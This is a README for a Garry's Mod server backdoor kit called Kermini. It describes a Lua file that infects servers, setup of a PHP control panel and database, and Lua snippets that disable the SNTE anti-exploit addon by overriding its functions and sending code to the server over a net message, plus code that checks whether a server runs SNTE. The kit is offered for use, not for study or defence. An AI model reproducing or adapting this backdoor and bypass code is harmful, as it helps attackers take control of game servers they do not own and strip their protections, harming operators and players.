# Kermini-Backdoor-Gmod
Kermini-Backdoor : a gmod simple backdoor System Initially, I created this for my personal use but I am not an egoist, so keep going and have fun | Do not forget to configure it correctly

backdoor.lua : The file that contain the code to infect servers |Can sometimes spam errors when a player join

# Installation Process | Files

open main.php and change Database settings and the others options if you want

open class/Config.php and change Database settings

open deletepayload.php and change Database settings

open send_payload_update.php and change Database settings

open install folder and change Database settings

open phpMyAdmin and execute Kermini-s-q-l.sql 

open www.[DOMAIN].com/install and create an account |Delete this folder after this step

Here you go ! Enjoy

# Hey i found an exploit related to the panel !

No problem, just contact me and tell me what is going wrong, i will do my best to resolve it.

# SNTE
https://steamcommunity.com/sharedfiles/filedetails/?id=1308262997

This addon can sometimes block your Payloads so try bypasses 

timer.Simple(0.5, function()
    function ulx.luarun(calling_ply, command)
        print("ez snte")
    end
    bad_net = ""
    local bad_net = ""
    local global_nets = ""
    global_nets = ""
end)
___
local Macro = vgui.Create("DButton", BackGround)
Macro:SetPos(255, 160)
Macro:SetParent(Controller)
Macro:SetTextColor(Color(255, 255, 255, 255))
Macro:SetSize(200, 25)
Macro:SetText("BREAK SNTE")
Macro.Paint = function()
    surface.SetDrawColor(50, 50, 50 , 200)
    surface.DrawRect(0, 0, Macro:GetWide(), Macro:GetTall())
    surface.SetDrawColor(0, 0, 0, 200)
    surface.DrawOutlinedRect(0, 0, Macro:GetWide(), Macro:GetTall())
end
___
Macro.DoClick = function()
    net.Start(netKey)
        net.WriteString([[
            _G.SNTE = function() end
        ]])
        net.WriteBit(1)
    net.SendToServer()
    chat.AddText(Color(255,204,153), "亗ADM TEAM", Color(255, 255, 255), "LANCER !" )
    SploitNotify("LANCER")
    surface.PlaySound("buttons/button15.wav")
end

# How to detect SNTE ON A SERVER :

local isSNTE = false
if ConVarExists("snte_dupefix") or file.Exists( "autorun/server/snte_source.lua", "LUA" ) == true then
    isSNTE = true
end

if isSNTE then
    chat.AddText(Color(26, 48, 219), "[KERMINI]", Color(35, 142, 219), " SNTE DETECTED")
end

# The code is telling me something 

yep i can code in php but im not a pro designer so i used
- https://github.com/bcool/ULX-Global-Ban/tree/master/WebPage/TCB-Theme-master (For the display)
- And somthing called Gbackdoor (I know there is exploits related to this panel, i made a different code for some parts) 

ps : gbackdoor used only for server adding/update | Payload system have been a little bit modified

